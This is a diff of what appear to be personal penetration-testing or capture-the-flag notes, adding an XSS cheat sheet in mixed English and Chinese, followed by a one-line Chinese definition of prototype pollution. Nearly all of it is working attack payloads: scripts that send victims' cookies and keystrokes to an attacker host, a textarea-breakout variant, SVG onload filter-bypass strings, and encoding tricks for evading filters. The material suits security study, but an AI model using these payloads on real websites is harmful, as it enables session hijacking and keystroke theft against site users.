@@ -1,8 +1,17 @@
+# XSS
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+"><svg onlod=confirm()>
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``¹//
+%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
+尝试：
+try URL encode
+try double URL encode.
+try triple URL encode.
+try base64 encode.
 
 原型污染是一种javascript漏洞，攻击者可以将任意属性添加到全局变量原型，然后这些属性可能被用户定义的对象继承。
 
